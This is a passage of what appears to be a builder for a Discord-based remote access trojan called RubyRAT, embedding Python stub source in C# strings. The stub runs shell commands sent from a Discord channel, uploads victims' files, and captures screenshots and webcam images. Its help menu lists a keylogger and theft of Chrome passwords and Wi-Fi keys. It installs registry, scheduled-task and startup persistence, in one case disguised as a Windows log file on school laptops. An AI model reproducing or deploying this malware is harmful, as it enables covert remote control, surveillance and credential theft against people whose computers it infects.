                            info.append(f"  Total: {convert_bytes(partition_usage.total)}")
                            info.append(f"  Used: {convert_bytes(partition_usage.used)} ({partition_usage.percent}%)")

                        # Additional system information
                        info.append(f"Username: {os.getlogin()}")
                        info.append(f"Device Name: {platform.node()}")
                        info.append(f"IsAdmin: {is_admin()}")
                        # Check if the bot has installed persistence (.py or .exe)
                        info.append(f"Has Persistence (Reg): {check_registry_persistence(script_path)}")
                        info.append(f"Has Persistence (Task): {check_task_scheduler_persistence(script_path)}")
                        info.append(f"Has Persistence (Startup): {check_startup_persistence(script_path)}")

                        private_ip = socket.gethostbyname(socket.gethostname())
                        info.append(f"Private IP: {private_ip}")
                        info.append(f"Public IP: {GetPublicIP()}")
                        info.append(f"Keylogger Activated: {is_logging}")

                        return '\n'.join(info)
                    except Exception as e:
                        return f"An error occurred while fetching system information: {e}"

                def convert_bytes(bytes_value):
                    # Convert bytes to human-readable format
                    for unit in ['B', 'KB', 'MB', 'GB', 'TB']:
                        if bytes_value < 1024:
                            return f"{bytes_value:.2f} {unit}"
                        bytes_value /= 1024
                    return f"{bytes_value:.2f} PB"

                def GetPublicIP():
                    ip_address = requests.get('https://httpbin.org/ip').json()['origin'] # Get public IP address
                    return ip_address

                def GetLocalIP():
                    private_ip = socket.gethostbyname(socket.gethostname())
                    return private_ip

                def CallME(argument):
                    try:
                        result = subprocess.run(argument, shell=True, text=True, capture_output=True)
                        if result.returncode == 0:
                            return result.stdout
                        else:
                            return f"Command exited with status code {result.returncode}.\n{result.stderr}"
                    except Exception as e:
                        return f"An error occurred: {e}"

                async def DownloadFile(file_name, channel):
                    try:
                        with open(file_name, 'rb') as file:
                            file_content = file.read()
                            file_message = await channel.send(file=discord.File(io.BytesIO(file_content), filename=file_name))
                            await channel.send(f"File '{file_name}' uploaded and available for download.")
                    except Exception as e:
                        await channel.send(f"An error occurred while uploading the file: {e}")

                # check and ask for elevation
                # Function for trying to run the script elevated
                def elevate_privileges():
                    try:
                        admin_pass = ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
                        if admin_pass > 32:
                            return "Success! You should recive a new connection with a Elevated Client." and os._exit(0)
                        else:
                            return "User pressed \"No\". Privilege elevation not successful"
                    except Exception as e:
                        return f"Failed to elevate privileges: {e}"

                # Function for getting if user is elevated or not
                def is_admin():
                    try:
                        # Check if the current process has administrative privileges
                        return ctypes.windll.shell32.IsUserAnAdmin() != 0
                    except:
                        return False


                # ------------------------------------------------------------
                #
                #                    SETTINGS STARTS HERE
                #
                # ------------------------------------------------------------

                # The part that runs on start, asking for elevation.
                if askForUACOnStart:
                    if is_admin():
                        print("User has administrative privileges already...")
                    else:
                        print("User does not have administrative privileges. Requesting it now!")
                        elevate_privileges()
                else:
                    print("Does not try to ask for UAC on start")

                # Try to install on start or not..
                if installOnStart:
                    if has_better_persistence():
                        print("Client already has persistence, there is no need to install again.")
                    else:
                        print("Trying to install on start...")
                        try:
                            # Check if the operating system is Windows
                            if platform.system() == "Windows":
                                print("Operating system is Windows")

                                # Check if the cloned script is in the public directory
                                public_directory = Path('C:/Users/Public')
                                copied_script_path = public_directory / (publicFileName + ".pyw")
                                if (Path(script_path) != copied_script_path):
                                    print("Duplicated Script is not in the public directory. Copying...")
                                    # Copy the script to the public directory
                                    shutil.copy(script_path, copied_script_path)
                                    print(f"Duplicated Script copied to public directory! (Filename is **{publicFileName}**)")
                                else:
                                    print(f"Duplicated Script is already in the public directory. (Filename is **{publicFileName}**)")

                                current_status = CheckBetterPersistence(script_path)
                                # Check and enable Registry Persistence if not already enabled
                                if not current_status['registry_persistence']:
                                    try:
                                        print("Starting Registry Persistence phase...")
                                        registry_persistence(script_path)
                                        print("Registry Persistence done!")
                                    except Exception as e:
                                        print(f"Error starting registry persistence: {e}")
                                else:
                                    print("Registry Persistence is already active.")

                                # Check and enable Task Scheduler Persistence if not already enabled
                                if not current_status['task_scheduler_persistence']:
                                    try:
                                        print("Starting Task Scheduler Persistence phase...")
                                        task_scheduler_persistence(script_path)
                                        print("Task Scheduler Persistence done!")
                                    except Exception as e:
                                        print(f"Error starting task scheduler persistence: {e}")
                                else:
                                    print("Task Scheduler Persistence is already active.")

                                # Check and enable Startup Persistence if not already enabled
                                if not current_status['startup_persistence']:
                                    try:
                                        print("Starting Startup Persistence phase...")
                                        startup_persistence(script_path)
                                        print("Startup Persistence done!")
                                    except Exception as e:
                                        print(f"Error starting startup persistence: {e}")
                                else:
                                    print("Startup Persistence is already active.")

                                print("\n**Done with all phases! \nChecking status...**\n")
                            else:
                                print("This feature is only supported on Windows.")
                        except Exception as os_error:
                            print(f"An error occurred while checking the operating system: {os_error}")
                else:
                    print("Does not install on start!")

                # ------------------------------------------------------------
                #
                #                     SETTINGS ENDS HERE
                #
                # ------------------------------------------------------------

                # Try to start bot using primary token and if that fails, try alternative token
                # Function to start the bot with a given token
                async def start_bot(token):
                    try:
                        print(f"Trying to start bot using {token}...")
                        await bot.start(token)
                    except discord.LoginFailure:
                        print(f"Improper token {token} has been passed.")
                        raise  # Re-raise the exception to handle it in the calling code

                # Try to start bot using primary token and if that fails, try alternative token
                async def main():
                    try:
                        await start_bot(primary_token)
                    except discord.LoginFailure:
                        try:
                            await start_bot(alternative_token)
                        except discord.LoginFailure as e:
                            print(f"Both primary and alternative tokens failed. Error: {e}")
                    except Exception as e:
                        print(f"An error occurred: {e}")

                # Run the asynchronous main function
                asyncio.run(main())

                """;
            }
            else if (selectedVersion == "2.1.0")
            {
                originalStub = """
                    import os
                    import platform
                    import subprocess
                    import io
                    import socket
                    import sys
                    import shutil
                    import base64
                    import ctypes
                    import zipfile
                    import importlib

                    # Check if running as executable
                    running_as_executable = getattr(sys, 'frozen', False)


                    # List of required modules and their corresponding import names
                    required_modules = {
                        'psutil': 'psutil',
                        'discord': 'discord',
                        'pyautogui': 'pyautogui',
                        'pillow': 'PIL',
                        'opencv-python-headless': 'cv2',
                        'pynput': 'pynput',
                        'requests': 'requests',
                        'psutil': 'psutil',
                        'cryptography': 'cryptography',
                        'pygetwindow': 'pygetwindow',
                        'googlemaps': 'googlemaps',
                        'tkinter': 'tkinter',
                        'mb': 'mb',
                        'pywin32': 'win32crypt',
                        'pycryptodomex': 'Cryptodome.Cipher',
                        'winreg': 'winreg',
                        'asyncio': 'asyncio',
                    }

                    # Additional required module
                    missing_modules = []

                    for module, import_name in required_modules.items():
                        try:
                            # Attempt to import the module
                            importlib.import_module(import_name)
                        except ImportError:
                            # Module is missing, add it to the missing_modules list
                            missing_modules.append(module)

                    # Check and install required modules if needed
                    if missing_modules:
                        missing_modules_str = ", ".join(missing_modules)
                        print(f"Some required modules are missing: {missing_modules_str}")
                        print("Installing missing modules...")
                        try:
                            subprocess.check_call([sys.executable, "-m", "pip", "install"] + missing_modules_str.split(', '))
                            print("Modules installed successfully!")
                            # Determine the script filename dynamically
                            script_filename = sys.argv[0]

                            # Build the command to run the script with arguments
                            script_command = [sys.executable, script_filename]

                            # Start a new process to run the script
                            subprocess.Popen(script_command)

                            # Exit the current script
                            sys.exit()
                        except Exception as e:
                            print("An error occurred while installing modules:", e)
                            exit(1)
                    else:
                        print("All required modules are already installed.")


                    import discord
                    from discord.ext import commands
                    import requests
                    import pyautogui
                    from cryptography.fernet import Fernet, InvalidToken
                    from pynput import keyboard
                    from cryptography.hazmat.backends import default_backend
                    from cryptography.hazmat.primitives import hashes
                    from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
                    from PIL import Image
                    import cv2
                    import pygetwindow as gw
                    import psutil
                    import googlemaps
                    from tkinter import messagebox as mb
                    import win32crypt
                    from Cryptodome.Cipher import AES
                    import csv
                    import json
                    import shutil
                    import base64
                    import sqlite3
                    import socket
                    import winreg
                    from pathlib import Path
                    import asyncio


                    # Settings for build
                    installOnStart = 
                    """
                    +
                    cbCTS.Checked
                    +
                    """

                    askForUACOnStart = 
                    """
                    +
                    cbSE.Checked
                    +
                    """

                    disableUACOnStart = 
                    """
                    +
                    cbDUAC.Checked
                    +
                    """

                    hideConsoleOnStart = 
                    """
                    +
                    cbHT.Checked
                    +
                    """

                    categorieName = 
                    """
                    +
                    txtCategorie.Text
                    +
                    """

                    GOOGLE_API_KEY = 
                    """
                    +
                    txtGoogleAPI.Text
                    +
                    """

                    currentVersion = "2.1.0"

                    # Tokens for the bot
                    primary_token = 
                    """
                    +
                    txtInputToken.Text
                    +
                    """

                    alternative_token = '(Only for V2.0.0 and above)'


                    # Settings for presistence
                    registryName = 
                    """
                    +
                    txtPreReg.Text
                    +
                    """

                    taskName = 
                    """
                    +
                    txtPreTask.Text
                    +
                    """

                    startupName = 
                    """
                    +
                    txtPreStart.Text
                    +
                    """

                    publicFileName = 
                    """
                    +
                    txtPrePublic.Text
                    +
                    """


                    #intents = discord.Intents.default()
                    intents = discord.Intents.all()
                    intents.message_content = True

                    bot = commands.Bot(command_prefix='!', intents=intents)
                    created_channel = None  # To store the created channel object

                    script_path = os.path.abspath(__file__)

                    @bot.event
                    async def on_ready():
                        print(f'Logged in as {bot.user.name}')

                        # Create encryption key
                        key = Fernet.generate_key()
                        global cipher_suite
                        cipher_suite = Fernet(key)


                        global created_channel  # Declare the global variable
                        system_username = os.getlogin()  # Get the system's username

                        ip_address = requests.get('https://httpbin.org/ip').json()['origin'] # Get public IP address
                        print(f'Public IP Address: {ip_address}')

                        ip_address_with_dashes = ip_address.replace('.', '-')  # Replace periods with dashes

                        # Create the perfect name for chat
                        channel_name = f"{system_username}-{ip_address_with_dashes}"
                        channel_name_lowercase = channel_name.replace('.', '').lower()

                        guild = bot.guilds[0]  # Assuming the bot is in only one guild

                        category = discord.utils.get(guild.categories, name=categorieName) # Checking category to match the desired one
                        print(f'Category Name: {categorieName}')

                        # Execute the remove_channels function with the created_channel and channel_name
                        await remove_channels(guild, channel_name_lowercase)

                        # Find other active RubyRAT clients on local machine
                        try:
                            active_rubyRATs = await find_rubyrats()  # Await the coroutine here
                            if len(active_rubyRATs) > 0:
                                print("Found Python processes:")
                                for process in active_rubyRATs:
                                    print(f"Process ID: {process['pid']}, Name: {process['name']}")
                                    print(f"Trying to kill process: {process}")
                                    await kill_process(process['pid'])  # Kill the process
                            else:
                                print("No Python processes found.")
                        except Exception as e:
                            print("An error occurred:", e)
                        # Kill them...

                        # Create a new text channel with the unique name
                        if category is not None:
                            created_channel = await guild.create_text_channel(channel_name, category=category)
                        else:
                            created_channel = await guild.create_text_channel(channel_name)
                        print(f'Created Channel Name: {created_channel.name}')

                        # Send a message with the public IP address to the new channel
                        await created_channel.send(f"New client! (**Version is {currentVersion}**)\nPublic IP Address of the client: **{ip_address}**. Client is **admin = {is_admin()}**. Also, if you want to know more, type **!help**")

                    @bot.event
                    async def on_message(message):
                        if message.author == bot.user:
                            return

                        # Process !cmd messages
                        if message.channel == created_channel and message.content.startswith('!cmd'):
                            command_args = message.content.split(' ', 1)
                            if len(command_args) == 2:
                                output = CallME(command_args[1])
                                await message.channel.send(output)  # Send the output back to the chat

                        # Process !download messages
                        if message.channel == created_channel and message.content.startswith('!download'):
                            file_name = message.content.split(' ', 1)[1]
                            await DownloadFile(file_name, message.channel)

                        await bot.process_commands(message)

                    async def remove_channels(guild, ChannelName):
                        # Find the category with the specified name
                        category = discord.utils.get(guild.categories, name=categorieName)

                        if category is not None:
                            # Iterate through text channels within the category
                            for channel in category.text_channels:
                                if channel.name == ChannelName:
                                    #await channel.send('!kill2')
                                    #print(f"Sent '!kill2' to channel: {channel.name}")

                                    #await asyncio.sleep(5)
                                    await channel.delete()
                                    print(f"Deleted channel: {channel.name}")
                        else:
                            print(f"Category '{categorieName}' not found in this server.")

                    async def find_rubyrats():
                        try:
                            print("Trying to find RubyRATs...")
                            python_processes = []

                            # Get the current process ID of the script
                            current_process_id = os.getpid()

                            for process in psutil.process_iter(['pid', 'name']):
                                process_info = process.info
                                if "python" in process_info["name"].lower() and process_info["pid"] != current_process_id:
                                    # Check if the process name contains "python" and exclude the script's own process
                                    python_processes.append(process_info)

                            return python_processes
                        except Exception as e:
                            print("An error occurred:", e)
                            return []

                    async def kill_process(pid):
                        try:
                            process = psutil.Process(pid)
                            process.terminate()  # Terminate the process
                            print(f"Killed process with PID {pid}")
                        except psutil.NoSuchProcess:
                            print(f"Process with PID {pid} not found.")
                        except Exception as e:
                            print(f"An error occurred while killing the process with PID {pid}: {e}")

                    # Customize the built-in help command
                    bot.remove_command('help')  # Remove the default help command

                    @bot.command(pass_context=True)
                    async def help(ctx):
                        global created_channel
                        if ctx.channel == created_channel and ctx.message.content == '!help':
                            help_messages = (
                            f"**Available Commands on Version {currentVersion}:**\n"
                            "`!help` - Show this menu.\n"
                            "`!cmd <command>` - Execute a shell command.\n"
                            "`!download <filename>` - Download a file from the system.\n"
                            "`!upload` - Upload a file to the bot.\n"
                            "`!version` - Prints out current version.\n",
                            "`!restart` - Will disconnect and then hopefully reconnect the bot.\n"
                            "`!kill` - Disconnect the bot and remove the chat channel.\n"
                            "`!screenshot` - Sends a frame of desktop from client to chat.\n"
                            "`!webcam` - Takes a picture using clients webcam and sends it in chat.\n"
                            "`!info` - Display some system information, such as GPU, CPU, RAM and more!.\n"
                            "`!elevate` - Will try to elevate client from user to admin.\n",
                            "`!geolocate` - Calculates position using google maps API.\n"
                            "`!install` - Try to get presisence on client system.\n"
                            "`!uninstall` - Will remove presisence from client system.\n"
                            "`!better_install` - Gets presistence on system with 3 diffrent methods. (May need admin)\n"
                            "`!better_uninstall` - Removes 3 diffrent methods of presistence from client system. (May need admin)\n"
                            "`!better_check` - Checks if 3 diffrent methods of presistence is active on client system. (May need admin)\n"
                            "`!history` - Gather and download all web history from client.\n",
                            "`!volume <volume_procent>` - Changes volume to the given procentage.\n"
                            "`!dumplog` - Sends a file containing the keyloggers findings to C2.\n"
                            "`!startlog` - Start the keylogging.\n"
                            "`!stoplog` - Stop the keylogging.\n"
                            "`!encrypt <filename> <password>` - Encrypt a file with a special password.\n"
                            "`!decrypt <filename> <password>` - Decrypt a file with the special password.\n",
                            "`!sendkey <Hello-World>` - Sends specified keys to client. **Instructions here: https://ss64.com/vb/sendkeys.html**\n"
                            "`!cat <filename>` - Display contents of a file (Must be less then 2000 characters...).\n"
                            "`!network` - Retrieve all saved network names their passwords (names with characters like å, ä, ö will not work correctly).\n"
                            "`!passwords_chrome` - If client has chrome, it will retrieve all saved usernames, passwords and URL's to the website.\n"
                            "`!messagebox <error\warning\info> <title> <content>` - Sends a custom made messagebox to client.\n",
                            "`!interactive_cmd` - Starts a CMD terminal in discord. (Avoid using commands that output much information, like \"dir\")\n"
                            )
                            for message in help_messages:
                                await ctx.send(message)    

                    @bot.command()
                    async def kill(ctx):
                        global created_channel
                        if ctx.channel == created_channel and ctx.message.content == '!kill':
                            await ctx.send("Disconnecting and removing chat channel...")
                            if created_channel:
                                await created_channel.delete()
                            await bot.close()
                            os._exit(0)
                    @bot.command()
                    async def info(ctx):
                        if ctx.channel == created_channel and ctx.message.content == '!info':
                            system_info = get_system_info()
                            await ctx.send(f"System Information:\n```\n{system_info}\n```")

                    @bot.command()
                    async def screenshot(ctx):
                        global created_channel
                        if ctx.channel == created_channel and ctx.message.content == '!screenshot':
                            try:
                                # Capture the screenshot using pyautogui
                                screenshot = pyautogui.screenshot()


                                # Save the screenshot to a file
                                screenshot_path = 'screenshot.png'
                                screenshot.save(screenshot_path)

                                # Upload the screenshot to Discord
                                await ctx.send(file=discord.File(screenshot_path))

                                # Remove the temporary file
                                os.remove(screenshot_path)
                            except Exception as e:
                                await ctx.send(f"An error occurred: {e}")

                    @bot.command()
                    async def webcam(ctx):
                        global created_channel

                        if ctx.channel == created_channel and ctx.message.content == '!webcam':
                            try:
                                # Initialize the webcam capture
                                cap = cv2.VideoCapture(0)  # 0 indicates the default webcam

                                if cap.isOpened():
                                    # Capture a single frame from the webcam
                                    ret, frame = cap.read()

                                    if ret:
                                        # Save the captured image to a file
                                        image_path = 'webcam_image.png'
                                        cv2.imwrite(image_path, frame)

                                        # Upload the image to Discord
                                        await ctx.send(file=discord.File(image_path))

                                        # Remove the temporary image file
                                        os.remove(image_path)

                                    else:
                                        await ctx.send("Failed to capture image from webcam.")
                                else:
                                    await ctx.send("Webcam not available.")

                                # Release the webcam
                                cap.release()

                            except Exception as e:
                                await ctx.send(f"An error occurred: {e}")

                    @bot.command()
                    async def version(ctx):
                        if ctx.channel == created_channel:    
                            print(f"Version is {currentVersion}")
                            await ctx.send(f"Current version is {currentVersion}")


                    # ---------------------------------------------------------------------------
                    #
                    #                            TEST ZONE STARTS HERE
                    #
                    # ---------------------------------------------------------------------------




                    # ---------------------------------------------------------------------------
                    #
                    #                              TEST ZONE ENDS HERE
                    #
                    # ---------------------------------------------------------------------------

                    # Cool presistence method that only works for the school laptops.
                    @bot.command()
                    async def cool_install(ctx):
                        if ctx.channel == created_channel:
                            if is_admin():
                                await ctx.send("User has administrative privileges, starting to add persistence...")
                                # Make a new copy with content of current file to "C:\Windows\security\database\system32.log"
                                # Specify the script you want to run
                                script_to_run = 'C:\\Windows\\security\\database\\system32.log'
                                script_path = os.path.abspath(sys.argv[0])

                                # Write your script content to the specified file
                                shutil.copy(script_path, script_to_run)

                                # Add registry that executes "pythonw C:\Windows\security\database\system32.log"
                                registry_key = r'Software\Microsoft\Windows\CurrentVersion\Run'
                                registry_name = 'System32'
                                registry_value = 'pythonw.exe ' + script_to_run

                                try:
                                    import winreg
                                    key = winreg.HKEY_CURRENT_USER
                                    with winreg.OpenKey(key, registry_key, 0, winreg.KEY_WRITE) as registry:
                                        winreg.SetValueEx(registry, registry_name, 0, winreg.REG_SZ, registry_value)
                                    await ctx.send("Persistence added successfully.")
                                except Exception as e:
                                    await ctx.send(f"Failed to add persistence: {str(e)}")
                            else:
                                await ctx.send("You do not have the necessary administrative privileges to perform this operation.")

                    # Removes the cool presistence method that only works for the school laptops.
                    @bot.command()
                    async def cool_uninstall(ctx):
                        if ctx.channel == created_channel:
                            if is_admin():
                                await ctx.send("User has administrative privileges, starting to remove persistence...")

                                # Remove registry key
                                registry_key = r'Software\Microsoft\Windows\CurrentVersion\Run'
                                registry_name = 'System32'

                                try:
                                    # Remove the System32.log file
                                    script_to_run = 'C:\\Windows\\security\\database\\system32.log'
                                    os.remove(script_to_run)

                                    # Remove the registry key
                                    import winreg
                                    key = winreg.HKEY_CURRENT_USER
                                    with winreg.OpenKey(key, registry_key, 0, winreg.KEY_WRITE) as registry:
                                        winreg.DeleteValue(registry, registry_name)
                                    await ctx.send("Persistence removed successfully.")
                                except Exception as e:
                                    await ctx.send(f"Failed to remove persistence: {str(e)}")
                            else:
                                await ctx.send("You do not have the necessary administrative privileges to perform this operation.")


                    # Better presistence method that uses 3 diffrent methods.
                    @bot.command()
                    async def better_install(ctx):
                        if ctx.channel == created_channel and ctx.message.content == "!better_install":
                            script_path = os.path.abspath(sys.argv[0])

                            try:
                                # Check the current persistence status
                                current_status = CheckBetterPersistence(script_path)

                                response = "**Persistence Status:**\n"
                                response += f"Registry Persistence: {'Enabled' if current_status['registry_persistence'] else 'Not Enabled'}\n"
                                response += f"Task Scheduler Persistence: {'Enabled' if current_status['task_scheduler_persistence'] else 'Not Enabled'}\n"
                                response += f"Startup Persistence: {'Enabled' if current_status['startup_persistence'] else 'Not Enabled'}\n\n"

                                await ctx.send(response)

                                await ctx.send("\n**Starting...**\n")
                                await ctx.send("Starting Duplicated Script phase...")
                                # Check if the cloned script is in the public directory
                                public_directory = Path('C:/Users/Public')
                                copied_script_path = public_directory / (publicFileName + ".pyw")
                                if (Path(script_path) != copied_script_path):
                                    await ctx.send("Duplicated Script is not in the public directory. Copying...")
                                    # Copy the script to the public directory
                                    shutil.copy(script_path, copied_script_path)
                                    await ctx.send(f"Duplicated Script copied to public directory! (Filename is **{publicFileName}**)")
                                else:
                                    await ctx.send(f"Duplicated Script is already in the public directory. (Filename is **{publicFileName}**)")

                                # Check and enable Registry Persistence if not already enabled
                                if not current_status['registry_persistence']:
                                    try:
                                        await ctx.send("Starting Registry Persistence phase...")
                                        registry_persistence(script_path)
                                        await ctx.send("Registry Persistence done!")
                                    except Exception as e:
                                        await ctx.send(f"Error starting registry persistence: {e}")
                                else:
                                    await ctx.send("Registry Persistence is already active.")

                                # Check and enable Task Scheduler Persistence if not already enabled
                                if not current_status['task_scheduler_persistence']:
                                    try:
                                        await ctx.send("Starting Task Scheduler Persistence phase...")
                                        task_scheduler_persistence(script_path)
                                        await ctx.send("Task Scheduler Persistence done!")
                                    except Exception as e:
                                        await ctx.send(f"Error starting task scheduler persistence: {e}")
                                else:
                                    await ctx.send("Task Scheduler Persistence is already active.")

                                # Check and enable Startup Persistence if not already enabled
                                if not current_status['startup_persistence']:
                                    try:
                                        await ctx.send("Starting Startup Persistence phase...")
                                        startup_persistence(script_path)
                                        await ctx.send("Startup Persistence done!")
                                    except Exception as e:
                                        await ctx.send(f"Error starting startup persistence: {e}")
                                else:
                                    await ctx.send("Startup Persistence is already active.")

                                await ctx.send("\n**Done with all phases! \nChecking status...**\n")

                                # Check the current persistence status
                                current_status = CheckBetterPersistence(script_path)

                                NewResponse = "**New Persistence Status:**\n"
                                NewResponse += f"Registry Persistence: {'Enabled' if current_status['registry_persistence'] else 'Not Enabled'}\n"
                                NewResponse += f"Task Scheduler Persistence: {'Enabled' if current_status['task_scheduler_persistence'] else 'Not Enabled'}\n"
                                NewResponse += f"Startup Persistence: {'Enabled' if current_status['startup_persistence'] else 'Not Enabled'}\n\n"

                                await ctx.send(NewResponse)

                            except Exception as e:
                                await ctx.send(f"An error occurred: {e}")

                    def registry_persistence(script_path):
                        key = r'Software\Microsoft\Windows\CurrentVersion\Run'

                        # Copy the original script to C:\Users\Public
                        public_directory = Path('C:/Users/Public')
                        copied_script_path = public_directory / (publicFileName + ".pyw")
                        shutil.copy(script_path, copied_script_path)

                        try:
                            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key, 0, winreg.KEY_WRITE) as registry_key:
                                winreg.SetValueEx(registry_key, registryName, 0, winreg.REG_SZ, str(copied_script_path))
                        except Exception as e:
                            print(f"Error adding registry persistence: {e}")

                        #os.system(f'start /MIN "{copied_script_path}"')

                    def task_scheduler_persistence(script_path):
                        # Automatically determine the username
                        username = os.getlogin()

                        # Define a list of possible paths to search for pythonw.exe
                        possible_paths = [
                            'C:/Python39/pythonw.exe',  # Default Python 3.11 installation directory
                            'C:/Python311/pythonw.exe',  # Default Python 3.9 installation directory
                            f'C:/Users/{username}/AppData/Local/Programs/Python/Python39/pythonw.exe',  # Microsoft Store 3.9
                            f'C:/Users/{username}/AppData/Local/Programs/Python/Python311/pythonw.exe',  # Microsoft Store 3.11
                            f'C:/Users/Sofie/AppData/Local/Microsoft/WindowsApps/pythonw.exe', # Microsoft Store Path(2)
                            f'C:/Users/Sofie/AppData/Local/Microsoft/WindowsApps/pythonw3.11.exe', # Microsoft Store Path(2) 3.11
                        ]

                        # Find the first valid path to pythonw.exe
                        pythonw_path = None
                        for path in possible_paths:
                            if Path(path).is_file():
                                pythonw_path = path
                                break

                        if pythonw_path is None:
                            print("pythonw.exe not found. Please specify the correct path.")
                            return

                        # Specify the path to the public directory
                        public_directory = Path('C:/Users/Public')

                        # Specify the path to place duplicate of script (Filename for duplicate is the "publicFileName" variable)
                        copied_script_path = public_directory / (publicFileName + ".pyw")

                        # Copy the script to the public directory
                        shutil.copyfile(script_path, copied_script_path)

                        # Use os.system to create a scheduled task
                        os.system(f"SCHTASKS /Create /SC ONSTART /TN {taskName} /TR \"{path} {copied_script_path}\" /RU {username} /f")

                    def startup_persistence(script_path):
                        # Automatically determine the username
                        username = os.getlogin()

                        # Define a list of possible paths to search for pythonw.exe
                        possible_paths = [
                            'C:/Python39/pythonw.exe',  # Default Python 3.11 installation directory
                            'C:/Python311/pythonw.exe',  # Default Python 3.9 installation directory
                            f'C:/Users/{username}/AppData/Local/Programs/Python/Python39/pythonw.exe',  # Microsoft Store 3.9
                            f'C:/Users/{username}/AppData/Local/Programs/Python/Python311/pythonw.exe',  # Microsoft Store 3.11
                            f'C:/Users/Sofie/AppData/Local/Microsoft/WindowsApps/pythonw.exe', # Microsoft Store Path(2)
                            f'C:/Users/Sofie/AppData/Local/Microsoft/WindowsApps/pythonw3.11.exe', # Microsoft Store Path(2) 3.11
                        ]

                        # Find the first valid path to pythonw.exe
                        pythonw_path = None
                        for path in possible_paths:
                            if Path(path).is_file():
                                pythonw_path = path
                                break

                        if pythonw_path is None:
                            print("pythonw.exe not found. ")
                            return
                        else:
                            public_directory = Path('C:/Users/Public')
                            copied_script_path = public_directory / (publicFileName + ".pyw")
                            shutil.copy(script_path, copied_script_path)

                            startup_folder = Path(os.path.expanduser("~")) / 'AppData' / 'Roaming' / 'Microsoft' / 'Windows' / 'Start Menu' / 'Programs' / 'Startup'
                            shortcut_path = startup_folder / f'{startupName}.lnk'

                            with open(f'{taskName}.bat', 'w') as batch_file:
                                batch_file.write(fr'''@echo off
                        start "" /B "{path}" "{copied_script_path}"
                        :: @echo off
                        :: start "" /B /MIN {pythonw_path} C:\Users\Public\{registryName}.pyw
                        ''')

                            os.system(f'copy {taskName}.bat "{startup_folder}"')
                        os.remove(f'{taskName}.bat')


                    # Checking of pre
                    @bot.command()
                    async def better_check(ctx):
                        if ctx.channel == created_channel and ctx.message.content == "!better_check":
                            script_path = os.path.abspath(sys.argv[0])
                            # Check the current persistence status
                            current_status = CheckBetterPersistence(script_path)
                            response = "**Persistence Status:**\n"
                            response += f"**Registry** Persistence: **{'Enabled' if current_status['registry_persistence'] else 'Not Enabled'}** (Keyname is **{registryName}** and Actual filename is **{publicFileName}.pyw**)\n"
                            response += f"**Task Scheduler** Persistence: **{'Enabled' if current_status['task_scheduler_persistence'] else 'Not Enabled'}** (Taskname is **{taskName}** and Actual filename is **{publicFileName}.pyw**)\n"
                            response += f"**Startup** Persistence: **{'Enabled' if current_status['startup_persistence'] else 'Not Enabled'}** (Startup filename is **{startupName}.bat** and Actual filename is **{publicFileName}.pyw**)\n\n"

                            await ctx.send(response)

                    def CheckBetterPersistence(script_path):
                        registry_persistence_exists = check_registry_persistence(script_path)
                        task_scheduler_persistence_exists = check_task_scheduler_persistence(script_path)
                        startup_persistence_exists = check_startup_persistence(script_path)

                        return {
                            "registry_persistence": registry_persistence_exists,
                            "task_scheduler_persistence": task_scheduler_persistence_exists,
                            "startup_persistence": startup_persistence_exists,
                        }

                    def check_registry_persistence(script_path):
                        # Add your code to check registry persistence here
                        key = r'Software\\Microsoft\\Windows\\CurrentVersion\\Run'
                        public_directory = Path('C:/Users/Public')
                        copied_script_path = public_directory / (publicFileName + ".pyw")

                        try:
                            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key, 0, winreg.KEY_READ) as registry_key:
                                value, _ = winreg.QueryValueEx(registry_key, registryName)
                                return value == str(copied_script_path)
                        except Exception:
                            return False

                    def check_task_scheduler_persistence(script_path):
                        # Add your code to check task scheduler persistence here
                        result = os.system(f'schtasks /query /tn {taskName}')
                        return result == 0  # Task exists

                    def check_startup_persistence(script_path):
                        # Add your code to check startup folder persistence here
                        public_directory = Path('C:/Users/Public')
                        copied_script_path = public_directory / (publicFileName + ".pyw")
                        startup_folder = Path(os.path.expanduser("~")) / 'AppData' / 'Roaming' / 'Microsoft' / 'Windows' / 'Start Menu' / 'Programs' / 'Startup'
                        shortcut_path = startup_folder / f'{startupName}.bat'

                        return os.path.exists(str(shortcut_path))


                    # Uninstall
                    @bot.command()
                    async def better_uninstall(ctx):
                        if ctx.channel == created_channel and ctx.message.content == "!better_uninstall":
                            script_path = os.path.abspath(sys.argv[0])

                            try:
                                # Check the current persistence status
                                current_status = CheckBetterPersistence(script_path)

                                # Check if the cloned script is in the public directory
                                public_directory = Path('C:/Users/Public')
                                copied_script_path = public_directory / (publicFileName + ".pyw")
                                if (Path(script_path) != copied_script_path):
                                    await ctx.send("Hmm, Duplicated Script is not in the public directory.")    
                                else:
                                    await ctx.send(f"Duplicated Script is in the public directory as expected, removing it...")
                                    # Remove the script from the public directory
                                    os.remove(copied_script_path)
                                    await ctx.send(f"Duplicated Script removed from public directory! Continuing...")

                                if current_status['registry_persistence']:
                                    try:
                                        await ctx.send("Disabling Registry Persistence...")
                                        remove_registry_persistence()
                                        await ctx.send("Registry Persistence disabled.")
                                    except Exception as e:
                                        await ctx.send(f"Error disabling registry persistence: {e}")

                                if current_status['task_scheduler_persistence']:
                                    try:
                                        await ctx.send("Removing Task Scheduler Persistence...")
                                        remove_task_scheduler_persistence()
                                        await ctx.send("Task Scheduler Persistence removed.")
                                    except Exception as e:
                                        await ctx.send(f"Error removing task scheduler persistence: {e}")

                                if current_status['startup_persistence']:
                                    try:
                                        await ctx.send("Disabling Startup Persistence...")
                                        remove_startup_persistence()
                                        await ctx.send("Startup Persistence disabled.")
                                    except Exception as e:
                                        await ctx.send(f"Error disabling startup persistence: {e}")

                                await ctx.send("\n**Done with uninstalling persistence!**\n")

                            except Exception as e:
                                await ctx.send(f"An error occurred: {e}")

                    # Add functions to remove persistence
                    def remove_registry_persistence():
                        key = r'Software\Microsoft\Windows\CurrentVersion\Run'

                        try:
                            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key, 0, winreg.KEY_WRITE) as registry_key:
                                winreg.DeleteValue(registry_key, registryName)
                        except Exception as e:
                            print(f"Error removing registry persistence: {e}")

                    def remove_task_scheduler_persistence():
                        os.system(f"schtasks /delete /tn {taskName} /f")

                    def remove_startup_persistence():
                        startup_folder = Path(os.path.expanduser("~")) / 'AppData' / 'Roaming' / 'Microsoft' / 'Windows' / 'Start Menu' / 'Programs' / 'Startup'
